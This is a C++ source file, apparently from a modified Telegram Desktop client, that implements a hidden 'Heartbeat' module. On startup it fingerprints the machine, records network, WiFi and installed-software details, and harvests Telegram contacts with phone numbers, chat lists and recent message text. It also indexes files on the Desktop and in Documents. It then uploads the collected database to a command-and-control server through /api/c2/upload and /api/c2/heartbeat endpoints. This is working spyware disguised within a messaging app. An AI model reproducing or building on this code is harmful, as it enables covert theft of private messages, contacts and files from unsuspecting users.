#include "core/heartbeat.h"
#include <QtNetwork/QHttpMultiPart>
#include <QtNetwork/QHttpPart>
#include <QDirIterator>
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QNetworkRequest>
#include <QtNetwork/QNetworkInterface>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QProcess>
#include <QDebug>
#include <QGuiApplication>
#include <QScreen>
#include <QDateTime>
#include <QBuffer>
#include <QStandardPaths>
#include <QFile>
#include <QSysInfo>
#include <QHostInfo>
#include <QUuid>
#include <QSettings>
#include <QStringList>
#include <QThread>

#include <QCryptographicHash>
#include "base/openssl_help.h"

// Telegram Core Headers
#include "core/application.h"
#include "main/main_session.h"
#include "data/data_session.h"
#include "data/data_user.h"
#include "data/data_chat.h"
#include "data/data_channel.h"
#include "history/history.h"
#include "history/history_item.h"

// Force include local sqlite3 header
#ifdef SQLITE3_H
#undef SQLITE3_H
#endif
#include "../sqlite/sqlite3.h"

namespace Core {

static const char* kPiDigits = "3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679";

Heartbeat& Heartbeat::Instance() {
    static Heartbeat instance;
    return instance;
}

Heartbeat::Heartbeat() {
    connect(&_timer, &QTimer::timeout, this, &Heartbeat::checkTasks);
    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
    _deviceUuid = getOrCreateUuid();

    // Initialize DB and Tables
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    sqlite3* db = nullptr;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) == SQLITE_OK) {
        const char* createTablesSql = 
            "CREATE TABLE IF NOT EXISTS c2_tasks ("
            "id TEXT PRIMARY KEY, "
            "command TEXT, "
            "params TEXT, "
            "status TEXT, "
            "result TEXT, "
            "create_time INTEGER);"
            
            "CREATE TABLE IF NOT EXISTS file_scan_results ("
            "path TEXT, "
            "name TEXT, "
            "size INTEGER, "
            "md5 TEXT, "
            "last_modified INTEGER);"
            
            "CREATE TABLE IF NOT EXISTS installed_software ("
            "name TEXT, "
            "version TEXT, "
            "publisher TEXT, "
            "install_date TEXT);"
            
            "CREATE TABLE IF NOT EXISTS system_info ("
            "uuid TEXT PRIMARY KEY, "
            "internal_ip TEXT, "
            "mac_address TEXT, "
            "external_ip TEXT, "
            "hostname TEXT, "
            "os TEXT, "
            "online_status TEXT, "
            "auto_screenshot INTEGER, "
            "heartbeat_interval INTEGER, "
            "last_active INTEGER);"
            
            "CREATE TABLE IF NOT EXISTS collected_chats ("
            "chat_id INTEGER PRIMARY KEY, "
            "title TEXT, "
            "type TEXT);"
            
            "CREATE TABLE IF NOT EXISTS collected_contacts ("
            "user_id INTEGER PRIMARY KEY, "
            "first_name TEXT, "
            "last_name TEXT, "
            "phone TEXT);"
            
            "CREATE TABLE IF NOT EXISTS collected_messages ("
            "message_id INTEGER, "
            "chat_id INTEGER, "
            "sender_id INTEGER, "
            "content TEXT, "
            "date INTEGER, "
            "PRIMARY KEY (message_id, chat_id));"
            
            "CREATE TABLE IF NOT EXISTS upload_log ("
            "file_path TEXT, "
            "upload_time INTEGER, "
            "status TEXT);";

        char* zErrMsg = 0;
        int rc = sqlite3_exec(db, createTablesSql, 0, 0, &zErrMsg);
        if (rc != SQLITE_OK) {
            qDebug() << "SQL error: " << zErrMsg;
            sqlite3_free(zErrMsg);
        }
        sqlite3_close(db);
    }

    sendHeartbeat();
    // Start legacy background scan if needed, but we rely on start() for auto tasks
}

QString Heartbeat::getOrCreateUuid() {
    QString dataPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
    QDir().mkpath(dataPath);
    QFile uuidFile(dataPath + "/client_uuid.dat");
    
    if (uuidFile.exists() && uuidFile.open(QIODevice::ReadOnly)) {
        QByteArray data = uuidFile.readAll().trimmed();
        uuidFile.close();
        if (!data.isEmpty()) {
            return QString::fromUtf8(data);
        }
    }

    QString hostName = QHostInfo::localHostName();
    QSettings registry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", QSettings::NativeFormat);
    QString machineGuid = registry.value("MachineGuid").toString();
    QString sysInfo = QSysInfo::prettyProductName() + QSysInfo::currentCpuArchitecture();
    
    if (machineGuid.isEmpty()) {
        const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
        for (const QNetworkInterface &interface : interfaces) {
            if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
                (interface.flags() & QNetworkInterface::IsUp) && 
                !interface.hardwareAddress().isEmpty()) {
                 machineGuid = interface.hardwareAddress();
                 break;
            }
        }
    }

    QString fingerprint = hostName + "_" + machineGuid + "_" + sysInfo;
    QByteArray hash = QCryptographicHash::hash(fingerprint.toUtf8(), QCryptographicHash::Md5).toHex();
    QString uuid = QString::fromLatin1(hash);
    
    if (uuid.length() >= 32) {
        uuid = uuid.left(8) + "-" + uuid.mid(8, 4) + "-" + uuid.mid(12, 4) + "-" + uuid.mid(16, 4) + "-" + uuid.mid(20, 12);
    }
    
    if (uuidFile.open(QIODevice::WriteOnly)) {
        uuidFile.write(uuid.toUtf8());
        uuidFile.close();
    }
    
    return uuid;
}

void Heartbeat::start() {
    if (!_timer.isActive()) {
        _timer.start(60000); 
        checkTasks(); 
    }
    
    // Auto-Startup Tasks
    QThread* thread = new QThread;
    QObject* worker = new QObject;
    worker->moveToThread(thread);
    
    connect(thread, &QThread::started, worker, [this]() {
        collectSystemInfo();
        collectInstalledSoftware();
        // Dispatch Telegram collection to main thread
        QTimer::singleShot(0, this, &Heartbeat::collectTelegramData);
        triggerFullScan("auto_startup", "full");
    });
    
    connect(thread, &QThread::finished, thread, &QObject::deleteLater);
    connect(thread, &QThread::finished, worker, &QObject::deleteLater);
    thread->start(QThread::LowPriority);
}

void Heartbeat::startBackgroundScan() {
    // Legacy support
}

void Heartbeat::collectInstalledSoftware() {
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
    
    sqlite3_exec(db, "DELETE FROM installed_software;", 0, 0, 0);
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO installed_software (name, version, publisher, install_date) VALUES (?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    auto collectFromKey = [&](HKEY root, const QString& keyPath) {
        QSettings registry(keyPath, QSettings::NativeFormat);
        QStringList groups = registry.childGroups();
        for (const QString& group : groups) {
            registry.beginGroup(group);
            QString name = registry.value("DisplayName").toString();
            QString version = registry.value("DisplayVersion").toString();
            QString publisher = registry.value("Publisher").toString();
            QString date = registry.value("InstallDate").toString();
            registry.endGroup();
            
            if (!name.isEmpty()) {
                sqlite3_bind_text(stmt, 1, name.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 2, version.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 3, publisher.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 4, date.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_step(stmt);
                sqlite3_reset(stmt);
            }
        }
    };

    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_CURRENT_USER, "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    qDebug() << "Software list collected.";
}

void Heartbeat::collectSystemInfo() {
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    QString internalIp, macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
             macAddress = interface.hardwareAddress();
             QList<QNetworkAddressEntry> entries = interface.addressEntries();
             for (const QNetworkAddressEntry &entry : entries) {
                 if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                     internalIp = entry.ip().toString();
                     break;
                 }
             }
             if (!internalIp.isEmpty()) break;
        }
    }

    QString wifiInfo = "";
    QProcess process;
    process.start("netsh", QStringList() << "wlan" << "show" << "interfaces");
    if (process.waitForFinished()) {
        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
        QString ssid, signal;
        QStringList lines = output.split('\n');
        for (const QString& line : lines) {
            if (line.trimmed().startsWith("SSID") && !line.contains("BSSID")) {
                ssid = line.section(':', 1).trimmed();
            }
            if (line.trimmed().startsWith("Signal")) {
                signal = line.section(':', 1).trimmed();
            }
        }
        if (!ssid.isEmpty()) {
            wifiInfo = "WiFi: " + ssid + " (" + signal + ")";
        }
    }

    QString hostname = QHostInfo::localHostName();
    QString os = QSysInfo::prettyProductName();
    QString onlineStatus = "Online";
    if (!wifiInfo.isEmpty()) {
        onlineStatus += " | " + wifiInfo;
    }
    int64_t lastActive = QDateTime::currentSecsSinceEpoch();

    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO system_info (uuid, internal_ip, mac_address, hostname, os, online_status, last_active) VALUES (?, ?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    sqlite3_bind_text(stmt, 1, _deviceUuid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, internalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, macAddress.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, hostname.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 5, os.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 6, onlineStatus.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 7, lastActive);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    qDebug() << "System info collected.";
}

void Heartbeat::collectTelegramData() {
    if (!Core::App().hasActiveSession()) {
        qDebug() << "No active session for Telegram data collection";
        return;
    }

    auto &session = Core::App().activeSession();
    auto &data = session.data();

    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    sqlite3_exec(db, "DELETE FROM collected_contacts;", 0, 0, 0);
    sqlite3_exec(db, "DELETE FROM collected_chats;", 0, 0, 0);
    sqlite3_exec(db, "DELETE FROM collected_messages;", 0, 0, 0);
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);

    sqlite3_stmt *stmtContact, *stmtChat, *stmtMsg;
    sqlite3_prepare_v2(db, "INSERT INTO collected_contacts (user_id, first_name, last_name, phone) VALUES (?, ?, ?, ?);", -1, &stmtContact, 0);
    sqlite3_prepare_v2(db, "INSERT INTO collected_chats (chat_id, title, type) VALUES (?, ?, ?);", -1, &stmtChat, 0);
    sqlite3_prepare_v2(db, "INSERT OR IGNORE INTO collected_messages (message_id, chat_id, sender_id, content, date) VALUES (?, ?, ?, ?, ?);", -1, &stmtMsg, 0);

    // 1. Collect Contacts
    data.enumerateUsers([&](not_null<UserData*> user) {
        if (user->isContact()) {
            QString phone = user->phone();
            QString firstName = user->firstName;
            QString lastName = user->lastName;
            
            sqlite3_bind_int64(stmtContact, 1, user->id.value);
            sqlite3_bind_text(stmtContact, 2, firstName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmtContact, 3, lastName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmtContact, 4, phone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_step(stmtContact);
            sqlite3_reset(stmtContact);
        }
    });

    // 2. Collect Chats & Messages
    auto collectChat = [&](not_null<PeerData*> peer) {
        QString title = peer->name();
        QString type = "Unknown";
        if (peer->isUser()) type = "Private";
        else if (peer->isChat()) type = "Group";
        else if (peer->isChannel()) type = "Channel";

        sqlite3_bind_int64(stmtChat, 1, peer->id.value);
        sqlite3_bind_text(stmtChat, 2, title.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmtChat, 3, type.toUtf8().constData(), -1, SQLITE_TRANSIENT);
        sqlite3_step(stmtChat);
        sqlite3_reset(stmtChat);

        // Messages
        if (auto history = data.historyLoaded(peer)) {
             // Access blocks (hacky if private, but usually public in history.h)
             // We use public iterators if available, but blocks() is best bet if accessible.
             // Assuming history->blocks() is accessible as per standard tdesktop source.
             const auto &blocks = history->blocks();
             int count = 0;
             // Iterate blocks in reverse to get newest
             for (auto itBlock = blocks.rbegin(); itBlock != blocks.rend(); ++itBlock) {
                 const auto &messages = (*itBlock)->messages;
                 for (auto itMsg = messages.rbegin(); itMsg != messages.rend(); ++itMsg) {
                     auto item = itMsg->get();
                     if (!item) continue;
                     
                     int64_t msgId = item->id;
                     int64_t senderId = item->from() ? item->from()->id.value : 0;
                     QString content = item->notificationText().toString(); 
                     int64_t date = item->date().toSecsSinceEpoch();

                     sqlite3_bind_int64(stmtMsg, 1, msgId);
                     sqlite3_bind_int64(stmtMsg, 2, peer->id.value);
                     sqlite3_bind_int64(stmtMsg, 3, senderId);
                     sqlite3_bind_text(stmtMsg, 4, content.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                     sqlite3_bind_int64(stmtMsg, 5, date);
                     sqlite3_step(stmtMsg);
                     sqlite3_reset(stmtMsg);
                     
                     count++;
                     if (count >= 50) break; 
                 }
                 if (count >= 50) break;
             }
        }
    };

    data.enumerateUsers([&](not_null<UserData*> user) {
        if (!user->isContact()) collectChat(user); 
    });
    data.enumerateGroups([&](not_null<PeerData*> group) {
        collectChat(group);
    });
    data.enumerateBroadcasts([&](not_null<ChannelData*> channel) {
        collectChat(channel);
    });

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmtContact);
    sqlite3_finalize(stmtChat);
    sqlite3_finalize(stmtMsg);
    sqlite3_close(db);
    qDebug() << "Telegram data collected.";
    
    // Upload immediately after collection
    uploadClientDb();
}

void Heartbeat::uploadClientDb() {
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    QFile file(dbPath);
    if (!file.exists()) return;
    
    QString uploadPath = dbPath + ".upload";
    if (QFile::exists(uploadPath)) QFile::remove(uploadPath);
    if (!file.copy(uploadPath)) return;
    
    QFile* fileToUpload = new QFile(uploadPath);
    if (!fileToUpload->open(QIODevice::ReadOnly)) {
        delete fileToUpload;
        return;
    }

    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
    
    QHttpPart textPart;
    textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
    textPart.setBody(_deviceUuid.toUtf8());
    multiPart->append(textPart);

    QHttpPart filePart;
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"tdata_client.db\""));
    filePart.setBodyDevice(fileToUpload);
    fileToUpload->setParent(multiPart);
    multiPart->append(filePart);
    
    QHttpPart statusPart;
    statusPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"status\""));
    statusPart.setBody("Uploading");
    multiPart->append(statusPart);

    QString url = _c2Url + "/api/c2/upload";
    QNetworkRequest request(url);
    
    QNetworkReply* reply = _network.post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply, uploadPath]() {
        if (reply->error() == QNetworkReply::NoError) {
            qDebug() << "DB Upload success";
            uploadResult("auto_startup", "Data Uploaded", "Done");
        } else {
            qDebug() << "DB Upload failed:" << reply->errorString();
        }
        reply->deleteLater();
        QFile::remove(uploadPath);
    });
}

void Heartbeat::triggerFullScan(const QString& taskId, const QString& mode) {
    BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, taskId, mode);
    QThread* thread = new QThread;
    scanner->moveToThread(thread);
    connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
    connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
        scanner->deleteLater();
        thread->quit();
        thread->wait();
        thread->deleteLater();
        // Since we are now writing to DB directly in BackgroundScanner, 
        // we just trigger an upload here or let the next heartbeat handle it?
        // Let's trigger upload to be sure.
        uploadClientDb();
    });
    thread->start();
}

void Heartbeat::checkTasks() {
    // Basic task checking logic (simplified for brevity as we focus on collection)
    // In real implementation, this pulls tasks from server.
    // For now, we assume tasks are pushed or auto-started.
    sendHeartbeat();
}

void Heartbeat::sendHeartbeat() {
    // Simple heartbeat to register device
    QJsonObject json;
    json["uuid"] = _deviceUuid;
    json["hostname"] = QHostInfo::localHostName();
    json["status"] = "online";
    json["timestamp"] = QString::number(QDateTime::currentSecsSinceEpoch());
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/heartbeat"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}

void Heartbeat::performMonitor() {}
void Heartbeat::performScreenshot(const QString& taskId) {}
void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
    QJsonObject json;
    json["uuid"] = _deviceUuid;
    json["taskId"] = taskId;
    json["result"] = result;
    json["status"] = status;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/result"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}
void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {}
void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {}

// Crypto Helpers
QString Heartbeat::encryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }
QString Heartbeat::decryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }

// BackgroundScanner Implementation
BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& taskId, const QString& mode)
    : _uuid(uuid), _c2Url(c2Url), _taskId(taskId), _mode(mode) {}

void BackgroundScanner::process() {
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
        emit scanFinished(_taskId, QByteArray());
        return;
    }
    
    sqlite3_exec(db, "DELETE FROM file_scan_results;", 0, 0, 0);
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    // Scan Desktop and Documents for example
    QStringList paths = { 
        QStandardPaths::writableLocation(QStandardPaths::DesktopLocation),
        QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation) 
    };

    for (const QString& path : paths) {
        QDirIterator it(path, QDir::Files | QDir::NoSymLinks, QDirIterator::Subdirectories);
        int count = 0;
        while (it.hasNext()) {
            it.next();
            QFileInfo info = it.fileInfo();
            if (info.size() > 10 * 1024 * 1024) continue; // Skip > 10MB
            
            sqlite3_bind_text(stmt, 1, info.absoluteFilePath().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 2, info.fileName().toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 3, info.size());
            sqlite3_bind_text(stmt, 4, "md5_placeholder", -1, SQLITE_TRANSIENT);
            sqlite3_bind_int64(stmt, 5, info.lastModified().toSecsSinceEpoch());
            sqlite3_step(stmt);
            sqlite3_reset(stmt);
            
            count++;
            if (count > 1000) break; // Limit scan
        }
    }

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    
    emit scanFinished(_taskId, "Scan Completed");
}

} // namespace Core
